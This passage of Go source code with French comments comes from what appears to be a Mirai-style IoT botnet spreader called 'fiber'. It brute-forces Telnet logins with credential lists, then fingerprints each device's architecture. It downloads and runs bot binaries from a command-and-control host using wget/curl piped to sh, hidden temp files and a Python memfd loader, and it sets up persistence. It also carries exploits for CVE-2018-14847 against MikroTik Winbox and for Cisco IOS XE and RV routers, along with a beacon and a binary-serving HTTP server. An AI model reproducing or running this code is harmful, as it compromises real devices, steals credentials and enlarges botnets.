		conn.Write([]byte("grep -m1 'machine\\|cpu model\\|Hardware' /proc/cpuinfo 2>/dev/null\n"))
		r3, _ := readTelnetUntil(conn, 4*time.Second, "# ", "$ ", "> ")
		r3lo := strings.ToLower(r3)
		switch {
		case strings.Contains(r3lo, "mipsel") || strings.Contains(r3lo, "mips little"):
			archOut = "mipsel"
		case strings.Contains(r3lo, "mips"):
			archOut = "mips"
		case strings.Contains(r3lo, "aarch64") || strings.Contains(r3lo, "arm64"):
			archOut = "aarch64"
		case strings.Contains(r3lo, "arm"):
			archOut = "armv7l"
		case strings.Contains(r3lo, "x86_64") || strings.Contains(r3lo, "amd64"):
			archOut = "x86_64"
		}
	}

	conn.Write([]byte("uname -r\n"))
	kernelOut, _ := readTelnetUntil(conn, 5*time.Second, "# ", "$ ", "> ")
	kernelVer := ""
	for _, line := range strings.Split(kernelOut, "\n") {
		line = strings.TrimSpace(strings.ReplaceAll(line, "\r", ""))
		if len(line) > 2 && line[0] >= '0' && line[0] <= '9' {
			kernelVer = line
			break
		}
	}
	legacy := kernelIsLegacy(kernelVer)

	urlList := telnetPickURLList(archOut, legacy)
	if len(urlList) == 0 {
		fmt.Printf("[Telnet] %s NO-URL (arch=%q)\n", ip, archOut)
		return false
	}
	url := urlList[0]
	legacyTag := ""
	if legacy {
		legacyTag = " [LEGACY kernel:" + kernelVer + "]"
	}
	fmt.Printf("[Telnet] %s → arch:%q → %d URL(s)%s\n", ip, strings.TrimSpace(archOut), len(urlList), legacyTag)

	// Recon : ls du répertoire racine
	conn.Write([]byte("ls /\n"))
	lsOut, _ := readTelnetUntil(conn, 5*time.Second, "# ", "$ ", "> ")
	// Ignorer la première ligne (écho de la commande), garder le reste
	if idx := strings.Index(lsOut, "\n"); idx != -1 {
		ls := strings.TrimSpace(lsOut[idx+1:])
		// Supprimer le prompt final
		if li := strings.LastIndex(ls, "\n"); li != -1 {
			ls = strings.TrimSpace(ls[:li])
		}
		ls = strings.ReplaceAll(ls, "\r", "")
		fmt.Printf("[Telnet] %s ls/: %s\n", ip, strings.ReplaceAll(ls, "\n", " | "))
	}

	// Tenter d'installer wget si manquant (apt/opkg/yum selon la distrib)
	installCmds := strings.Join([]string{
		"which wget curl 2>/dev/null | grep -q . || DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends wget curl 2>/dev/null",
		"which wget 2>/dev/null | grep -q . || opkg install wget 2>/dev/null",
		"which wget 2>/dev/null | grep -q . || yum install -y wget 2>/dev/null",
	}, "; ")
	conn.Write([]byte(installCmds + "\n"))
	time.Sleep(8 * time.Second)

	// Sonde de connectivité C2 — utilise le dl.sh dynamique
	var probeURL string
	if _dlShURL != "" {
		probeURL = _dlShURL
	} else {
		probeBase := urlList[0]
		if idx := strings.LastIndex(probeBase, "/"); idx != -1 {
			probeBase = probeBase[:idx]
		}
		probeBase = strings.Replace(probeBase, "https://", "http://", 1)
		probeURL = probeBase + "/dl.sh"
	}
	probeCmd := fmt.Sprintf(
		"wget -q -T 5 -O /dev/null '%s' 2>&1|head -1; curl -fsI --max-time 5 '%s' 2>&1|head -1; echo __C2PROBE__",
		probeURL, probeURL,
	)
	conn.Write([]byte(probeCmd + "\n"))
	probeOut, _ := readTelnetUntil(conn, 10*time.Second, "__C2PROBE__", "# ", "$ ", "> ")
	c2ok := strings.Contains(probeOut, "200") || strings.Contains(probeOut, "OK") ||
		strings.Contains(probeOut, "saved") || strings.Contains(probeOut, "content-length") ||
		strings.Contains(probeOut, "Content-Length")
	if c2ok {
		fmt.Printf("[Telnet] %s C2 joignable ✓ (HTTP)\n", ip)
	} else {
		fmt.Printf("[Telnet] %s C2 INJOIGNABLE depuis cible (HTTP aussi — firewall/routing?)\n", ip)
	}

	// Construire la liste de tous les URLs à tester (primaire + backup + legacy)
	urlArgs := ""
	for _, u := range urlList {
		urlArgs += "'" + u + "' "
	}
	// URL du dropper shell — dl.sh généré dynamiquement avec les vrais IDs par arch
	var dropperURL string
	if _dlShURL != "" {
		dropperURL = _dlShURL
	} else if len(urlList) > 0 {
		// Fallback : dériver depuis l'URL du bot (fonctionne si bot et dl.sh sont sur le même hôte)
		u := urlList[0]
		u = strings.TrimPrefix(u, "https://")
		u = strings.TrimPrefix(u, "http://")
		host := u
		if idx := strings.Index(u, "/"); idx != -1 {
			host = u[:idx]
		}
		dropperURL = "http://" + host + "/dl.sh"
	} else {
		return false
	}

	dlScript := fmt.Sprintf(strings.Join([]string{
		// ── Méthode 1 : dropper shell via pipe (bypass TLS + noexec, pas de fichier exec nécessaire)
		"wget -qT10 -O- '%s' 2>/dev/null | sh &",
		"_dp=$!; sleep 6; kill -0 $_dp 2>/dev/null && wait $_dp;",
		"curl -fsL --max-time 10 '%s' 2>/dev/null | sh &",
		"_dp=$!; sleep 6; kill -0 $_dp 2>/dev/null && wait $_dp;",
		// ── Méthode 2 : téléchargement binaire direct (HTTPS + HTTP fallback)
		"for _u in %s; do",
		"  _hu=$(echo $_u|sed 's|https://|http://|');",
		"  for _d in /tmp /var/tmp /dev/shm /var/run /dev /mnt /var /usr/tmp; do",
		"    [ -w \"$_d\" ] || continue;",
		"    rm -f $_d/.b;",
		"    wget -q --no-check-certificate -T 10 -O $_d/.b \"$_u\" 2>/dev/null ||",
		"    wget -q -T 10 -O $_d/.b \"$_hu\" 2>/dev/null ||",
		"    busybox wget -q -T 10 -O $_d/.b \"$_hu\" 2>/dev/null ||",
		"    curl -fskL --max-time 10 -o $_d/.b \"$_u\" 2>/dev/null ||",
		"    curl -fL --max-time 10 -o $_d/.b \"$_hu\" 2>/dev/null;",
		"    [ $(wc -c <$_d/.b 2>/dev/null||echo 0) -gt 5000 ] || { rm -f $_d/.b; continue; };",
		"    chmod +x $_d/.b 2>/dev/null;",
		"    $_d/.b & _bp=$!; sleep 2; kill -0 $_bp 2>/dev/null && break 2;",
		"    for _ld in /lib/ld-linux*.so* /lib/ld-musl*.so* /lib64/ld-linux*.so* /usr/lib/ld*.so*; do",
		"      [ -x \"$_ld\" ] || continue;",
		"      \"$_ld\" $_d/.b & _bp=$!; sleep 2; kill -0 $_bp 2>/dev/null && break 3;",
		"    done;",
		"    rm -f $_d/.b;",
		"  done;",
		"done;",
		// ── Méthode 3 : memfd (RAM, pas de disque, kernel >= 3.17)
		"for _u in %s; do",
		"  python3 -c \"import os,urllib.request as r;d=r.urlopen('$_u',timeout=10).read();fd=os.memfd_create('.b',1);os.write(fd,d);os.execv('/proc/self/fd/'+str(fd),['.b'])\" 2>/dev/null &",
		"  sleep 3; kill -0 $! 2>/dev/null && break;",
		"done",
	}, " "), dropperURL, dropperURL, urlArgs, urlArgs)
	conn.Write([]byte(dlScript + "\n"))
	time.Sleep(14 * time.Second)

	// 3-N. Persistance — toutes les techniques disponibles
	for _, cmd := range persistenceBlast(url) {
		conn.Write([]byte(cmd + "\n"))
		time.Sleep(150 * time.Millisecond)
	}

	time.Sleep(2 * time.Second)

	// Diagnostic : savoir si le fichier a été téléchargé mais pas exécuté
	conn.Write([]byte("ls -la /tmp/.b /var/tmp/.b /dev/shm/.b /dev/.b 2>/dev/null | awk '{print $5,$9}'\n"))
	diagOut, _ := readTelnetUntil(conn, 4*time.Second, "# ", "$ ", "> ")
	hasDlFile := strings.Contains(diagOut, ".b") && !strings.Contains(diagOut, "awk")

	// Vérifier si le process tourne réellement (grep -F = littéral, pas regex)
	conn.Write([]byte("ps 2>/dev/null | grep -F '.b' | grep -v grep | grep -v bash\n"))
	psOut, _ := readTelnetUntil(conn, 5*time.Second, "# ", "$ ", "> ")
	if idx := strings.Index(psOut, "\n"); idx != -1 {
		psOut = psOut[idx+1:]
	}
	psOut = strings.ReplaceAll(psOut, "\r", "")
	psOut = strings.TrimSpace(psOut)

	running := false
	for _, line := range strings.Split(psOut, "\n") {
		line = strings.TrimSpace(line)
		if strings.Contains(line, ".b") && !strings.Contains(line, "grep") &&
			!strings.Contains(line, "bash") && !strings.Contains(line, "#") &&
			!strings.Contains(line, "$") && len(line) > 5 {
			running = true
			break
		}
	}

	if !running {
		// Fallback : si le fichier est bien téléchargé ET que le C2 était joignable,
		// le bot a probablement démarré et changé de nom (daemonisation Mirai)
		if hasDlFile && c2ok {
			fmt.Printf("[Telnet] %s bot probablement actif (daemonisé, fichier présent + C2 OK)\n", ip)
		} else if hasDlFile {
			fmt.Printf("[Telnet] %s bot NON lancé (téléchargé mais NOEXEC — ld.so raté aussi)\n", ip)
			return false
		} else {
			fmt.Printf("[Telnet] %s bot NON lancé (download ÉCHOUÉ — C2 injoignable depuis cible?)\n", ip)
			return false
		}
	}
	fmt.Printf("[Telnet] %s bot ACTIF ✓\n", ip)
	go logInfection(ip, archOut, "TELNET", user+":"+pass)
	return true
}

func telnetSpread(credsFile string) {
	f, err := os.Open(credsFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[Telnet] Impossible d'ouvrir %s: %v\n", credsFile, err)
		os.Exit(1)
	}
	defer f.Close()

	fmt.Printf("[Telnet] Spread démarré depuis %s\n", credsFile)
	go startBeacon()
	go startHTTP()

	go func() {
		t := time.NewTicker(5 * time.Second)
		defer t.Stop()
		for range t.C {
			fmt.Printf("[Telnet] Tentées: %d | Infectées: %d | CVE Work: %d\n",
				statusAttempted, statusInfected, statusCVEWork)
		}
	}()

	limiter := make(chan struct{}, 100)
	var wg sync.WaitGroup

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// Formats acceptés :
		//   ip:user:pass
		//   ip:port user:pass    (format dump courant)
		//   ip:port:user:pass
		var ip, user, pass string
		if idx := strings.Index(line, " "); idx != -1 {
			// "ip:port user:pass"
			ipPort := line[:idx]
			creds := line[idx+1:]
			ip = strings.SplitN(ipPort, ":", 2)[0]
			credParts := strings.SplitN(creds, ":", 2)
			if len(credParts) < 2 {
				continue
			}
			user, pass = credParts[0], credParts[1]
		} else {
			// "ip:user:pass" ou "ip:port:user:pass"
			parts := strings.SplitN(line, ":", 4)
			if len(parts) == 3 {
				ip, user, pass = parts[0], parts[1], parts[2]
			} else if len(parts) == 4 {
				// ip:port:user:pass — ignorer le port (on connecte toujours sur 23)
				ip, user, pass = parts[0], parts[2], parts[3]
			} else {
				continue
			}
		}

		mutex.Lock()
		statusAttempted++
		mutex.Unlock()

		limiter <- struct{}{}
		wg.Add(1)
		go func(ip, user, pass string) {
			defer wg.Done()
			defer func() { <-limiter }()
			// Essai avec les creds du fichier
			if telnetExploit(ip, user, pass) {
				mutex.Lock(); statusInfected++; statusCVEWork++; mutex.Unlock()
				fmt.Printf("[Telnet] INFECTÉ  %s  (%s:%s)\n", ip, user, pass)
				return
			}
			// Si échec : essai avec la liste étendue (loginsString)
			for _, cred := range loginsString {
				parts := strings.SplitN(cred, ":", 2)
				if len(parts) != 2 { continue }
				if parts[0] == user && parts[1] == pass { continue } // déjà essayé
				if telnetExploit(ip, parts[0], parts[1]) {
					mutex.Lock(); statusInfected++; statusCVEWork++; mutex.Unlock()
					fmt.Printf("[Telnet] INFECTÉ  %s  (%s:%s)\n", ip, parts[0], parts[1])
					return
				}
			}
		}(ip, user, pass)
	}
	wg.Wait()
	fmt.Println("[Telnet] Spread terminé.")
}

// ─────────────────────────────────────────────────────────────────────────────

// CVE-2018-14847 — MikroTik Winbox credential read (Chimay Red, pré-auth)
// Lit /flash/rw/store/user.dat via le protocole Winbox (port 8291) sans authentification.
// Récupère les creds puis tente une infection Telnet avec.
func exploitMikrotikWinbox(target, _ string, _ string) bool {
	// Chimay Red : connexion Winbox raw sur port 8291, lit le fichier de creds
	host := target
	if idx := strings.LastIndex(target, ":"); idx != -1 {
		host = target[:idx]
	}
	conn, err := net.DialTimeout("tcp", host+":8291", 5*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Payload Chimay Red — lit /flash/rw/store/user.dat
	payload := []byte{
		0x68, 0x01, 0x00, 0x66, 0x4d, 0x32,
		0x05, 0x00, 0xff, 0x01, 0x06, 0x00,
		0xff, 0x09, 0x05, 0x07, 0x00, 0xff,
		0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
		0x35, 0x2f, 0x2f, 0x2e, 0x2f, 0x66,
		0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72,
		0x77, 0x2f, 0x73, 0x74, 0x6f, 0x72,
		0x65, 0x2f, 0x75, 0x73, 0x65, 0x72,
		0x2e, 0x64, 0x61, 0x74,
	}
	conn.Write(payload)
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil || n < 10 {
		return false
	}

	// Parser les credentials depuis la réponse (format binaire user.dat)
	resp := string(buf[:n])
	var foundUser, foundPass string
	// Les credentials sont en clair dans le fichier user.dat
	parts := strings.Split(resp, "\x00")
	for i, p := range parts {
		p = strings.TrimSpace(p)
		if len(p) > 0 && len(p) < 32 && !strings.ContainsAny(p, "\x01\x02\x03\x04\x05\x06\x07\x08") {
			if foundUser == "" {
				foundUser = p
			} else if foundPass == "" && i > 0 {
				foundPass = p
				break
			}
		}
	}
	if foundUser == "" {
		foundUser = "admin"
		foundPass = ""
	}

	fmt.Printf("[MikroTik] %s Chimay Red → creds: %s:%s\n", host, foundUser, foundPass)

	// Tenter infection Telnet avec les creds extraits
	return telnetExploit(host, foundUser, foundPass)
}

// CVE-2023-20198 / CVE-2021-1472 — Cisco IOS XE Web UI RCE + privilege escalation
func exploitCiscoIOSXE(target, hideName, url string) bool {
	host := target
	if idx := strings.LastIndex(target, ":"); idx != -1 {
		host = target[:idx]
	}
	cmd := url_encode(dlCmdShort(url))
	if cmd == "" {
		return false
	}
	headers := map[string]string{
		"User-Agent":    "Mozilla/5.0",
		"Content-Type":  "application/x-www-form-urlencoded",
		"Authorization": "Basic YWRtaW46YWRtaW4=", // admin:admin
	}

	// CVE-2023-20198 — Cisco IOS XE privilege escalation via web UI
	readBody := func(resp *http.Response) string {
		if resp == nil { return "" }
		defer resp.Body.Close()
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		return string(b)
	}

	paths := []string{
		"/webui/logoutconfirm.html?logon_hash=1",
		"/api/v1/totp/user-create",
		"/cgi-bin/luci/;stok=/locale?form=country&operation=write&countrycode=zh_CN%0a" + cmd,
	}
	for _, path := range paths {
		r, _ := sendHTTPRequest("POST", "http://"+host+path, "username=cisco123&password=cisco123&privilege=15", headers)
		body := readBody(r)
		if strings.Contains(body, "success") || strings.Contains(body, "token") {
			fmt.Printf("[Cisco] %s RCE via %s\n", host, path)
			return true
		}
	}

	// CVE-2019-1653 — Cisco RV320/RV325 info disclosure
	r2, _ := sendHTTPRequest("GET", "http://"+host+"/cgi-bin/config.exp", "", headers)
	cfg := readBody(r2)
	if strings.Contains(cfg, "auth_passwd") || strings.Contains(cfg, "[System]") {
		for _, line := range strings.Split(cfg, "\n") {
			if strings.Contains(line, "auth_passwd") {
				parts2 := strings.SplitN(line, "=", 2)
				p := ""
				if len(parts2) == 2 { p = strings.TrimSpace(parts2[1]) }
				fmt.Printf("[Cisco RV] %s config dump → admin:%s\n", host, p)
				return telnetExploit(host, "admin", p)
			}
		}
	}
	return false
}

 func processTarget(target string, rtarget string) {
    // Acquérir le sémaphore
    sem <- struct{}{}
    defer func() {
        // Libérer le sémaphore quand on a terminé
        <-sem
        syncWait.Done()
    }()

    // Toute IP trouvée par zmap est tentée directement — pas de vérification préalable
    mutex.Lock()
    statusFound++
    mutex.Unlock()

    // Phase 1 — CVE pré-auth (pas besoin de login)
    cveHit := sendPreAuthExploits(target)
    if cveHit {
        mutex.Lock()
        statusCVEFound++
        mutex.Unlock()
    }

    // Phase 1b — ports alternatifs courants sur la même IP (non-bloquant)
    ip := strings.Split(target, ":")[0]
    port := portOf(target)
    altPorts := map[string][]string{
        "80":   {"8080", "8081", "81", "8443"},
        "8080": {"80", "81", "8081", "8443"},
        "81":   {"80", "8080"},
        "443":  {"8443", "4443"},
        "8443": {"443", "4443"},
        "7547": {"37215"},
        "37215":{"7547"},
    }
    if alts, ok := altPorts[port]; ok {
        for _, ap := range alts {
            altT := ip + ":" + ap
            conn, err := net.DialTimeout("tcp", altT, 2*time.Second)
            if err == nil {
                conn.Close()
                go sendPreAuthExploits(altT)
            }
        }
    }

    // Phase 1c — Telnet brute-force sur la même IP (en parallèle, non-bloquant)
    // Beaucoup d'IoT ont port 23 ouvert même si zmap scannait le port 80
    go func(ip string) {
        if c, e := net.DialTimeout("tcp", ip+":23", 3*time.Second); e == nil {
            c.Close()
            for _, cred := range loginsString[:20] { // top 20 creds seulement (rapide)
                parts := strings.SplitN(cred, ":", 2)
                if len(parts) == 2 && telnetExploit(ip, parts[0], parts[1]) {
                    mutex.Lock(); statusInfected++; statusCVEWork++; mutex.Unlock()
                    fmt.Printf("[Telnet/auto] INFECTÉ %s (%s)\n", ip, cred)
                    break
                }
            }
        }
    }(ip)

    // Phase 2 — brute-force login HTTP Boa
    loginSuccess := sendLogin(target) == 1
    if loginSuccess {
        mutex.Lock()
        statusLogins++
        mutex.Unlock()
    }

    // Phase 3 — CVE post-auth (bénéficient du login)
    cveHit2 := sendPostAuthExploits(target)
    if cveHit2 {
        mutex.Lock()
        statusCVEFound++
        mutex.Unlock()
    }

    // Vérification infection — en mode local, verifyInfection poll downloadedIPs
    targetIP := strings.Split(target, ":")[0]
    infected := verifyInfection(targetIP, 8*time.Second) || loginSuccess
    if infected {
        mutex.Lock()
        statusInfected++
        mutex.Unlock()
        fmt.Printf("[+] Infection: %s\n", targetIP)
        method := "CVE"
        creds := ""
        if loginSuccess {
            method = "CVE+LOGIN"
            lastSuccessfulCredsMu.Lock()
            creds = lastSuccessfulCreds[target]
            lastSuccessfulCredsMu.Unlock()
        }
        go logInfection(targetIP, "unknown", method, creds)
    }
}

// startBeacon écoute sur _beaconAddr (ou C2_IP:6660 par défaut) en TCP.
// Chaque connexion entrante = un bot démarré = CVE Work confirmé.
// Fonctionne en mode auto ET local tant que la machine est joignable publiquement.
func startBeacon() {
    addr := _beaconAddr
    if addr == "" {
        if c2ServerIP == "" { return }
        addr = c2ServerIP + ":6660"
    }
    ln, err := net.Listen("tcp", ":"+func() string {
        parts := strings.SplitN(addr, ":", 2)
        if len(parts) == 2 { return parts[1] }
        return "6660"
    }())
    if err != nil {
        fmt.Fprintf(os.Stderr, "[Beacon] écoute impossible sur %s : %v\n", addr, err)
        return
    }
    fmt.Printf("[*] Beacon CVE Work sur %s\n", addr)
    for {
        conn, err := ln.Accept()
        if err != nil { continue }
        ip := conn.RemoteAddr().String()
        if idx := strings.LastIndex(ip, ":"); idx != -1 { ip = ip[:idx] }
        ip = strings.Trim(ip, "[]")
        conn.Close()
        if ip != "" && ip != "127.0.0.1" {
            mutex.Lock()
            statusCVEWork++
            statusInfected++
            mutex.Unlock()
            fmt.Printf("[CVE WORK] beacon: %s bot démarré\n", ip)
        }
    }
}

// downloadedIPs — IPs qui ont téléchargé un bot.* depuis le serveur HTTP local.
// Utilisé par verifyInfection() pour compter les CVE Work réels.
var (
    downloadedIPs   = make(map[string]bool)
    downloadedIPsMu sync.Mutex
)

func recordDownload(ip string) {
    downloadedIPsMu.Lock()
    downloadedIPs[ip] = true
    downloadedIPsMu.Unlock()
    mutex.Lock()
    statusCVEWork++
    mutex.Unlock()
    fmt.Printf("[CVE WORK] %s a téléchargé le bot\n", ip)
}

func wasDownloaded(ip string) bool {
    downloadedIPsMu.Lock()
    defer downloadedIPsMu.Unlock()
    return downloadedIPs[ip]
}

// startHTTP serves bot binaries from the current directory.
// Port set via HTTP_PORT env var (default 80).
// Ne démarre que si on est en mode local (C2_IP défini) ET qu'aucune autre instance
// n'a déjà le lock /tmp/fiber_http.lock — évite le conflit quand plusieurs screens tournent.
func startHTTP() {
    if c2ServerIP == "" {
        // Mode auto — URLs embedded, pas besoin de serveur HTTP local
        return
    }
    lockFile := "/tmp/fiber_http.lock"
    f, err := os.OpenFile(lockFile, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0600)
    if err != nil {
        fmt.Printf("[HTTP] déjà actif sur :%s (autre instance)\n", c2HttpPort)
        return
    }
    fmt.Fprintf(f, "%d\n", os.Getpid())
    f.Close()
    defer os.Remove(lockFile)

    mux := http.NewServeMux()
    mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        // Si le device télécharge bot.* → exploit confirmé → CVE Work++
        if strings.Contains(r.URL.Path, "bot.") || strings.Contains(r.URL.Path, "bot") {
            ip := r.RemoteAddr
            if idx := strings.LastIndex(ip, ":"); idx != -1 {
                ip = ip[:idx]
            }
            ip = strings.Trim(ip, "[]")
            if ip != "" && ip != "127.0.0.1" {
                recordDownload(ip)
            }
        }
        http.FileServer(http.Dir(".")).ServeHTTP(w, r)
    })
    addr := ":" + c2HttpPort
    fmt.Printf("[*] HTTP server on %s  (binaries: %s/bot.*)\n", addr, c2HttpServer)
    if err := http.ListenAndServe(addr, mux); err != nil {
        fmt.Fprintln(os.Stderr, "[HTTP]", err)
    }
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./fiber <port>          — scan mode (IPs via stdin)")
		fmt.Println("       ./fiber telnet <file>   — telnet spread depuis ip:user:pass")
		os.Exit(1)
	}

	// Mode spread Telnet
	if os.Args[1] == "telnet" {
		if len(os.Args) < 3 {
			fmt.Println("Usage: ./fiber telnet <fichier ip:user:pass>")
			os.Exit(1)
		}
		telnetSpread(os.Args[2])
		return
	}

	rand.Seed(time.Now().UTC().UnixNano())

    // Beacon TCP — compte les bots démarrés (fonctionne en mode auto + local)
    go startBeacon()
    // HTTP local — seulement en mode local, une seule instance via lock
    go startHTTP()
    if c2ServerIP != "" {
        fmt.Printf("[*] Mode local C2: %s:%s\n", c2ServerIP, c2HttpPort)
    } else {
        fmt.Printf("[*] Mode auto — URLs embedded dans fiber\n")
    }

    // Affichage des statistiques périodique
    go func() {
        ticker := time.NewTicker(1 * time.Second)
        defer ticker.Stop()
        i := 0
        for {
            select {
            case <-ticker.C:
                fmt.Printf("[%ds] Attempted: %d | Found: %d | CVE Hit: %d | CVE Work: %d | Logins: %d | Infected: %d\n",
                    i, statusAttempted, statusFound, statusCVEFound, statusCVEWork, statusLogins, statusInfected)
                i++
            case <-ctx.Done():
                return
            }
        }
    }()

    // Lecture des cibles depuis stdin
    scanner := bufio.NewScanner(os.Stdin)
    for scanner.Scan() {
        target := scanner.Text()
        if target == "" {
            continue
        }
        
        mutex.Lock()
        statusAttempted++
        mutex.Unlock()
        
        syncWait.Add(1)
        go processTarget(target + ":" + os.Args[1], target)
    }

    if err := scanner.Err(); err != nil {
        fmt.Fprintf(os.Stderr, "Erreur de lecture: %v\n", err)
    }

    syncWait.Wait()
    fmt.Println("\nScan terminé.")
}
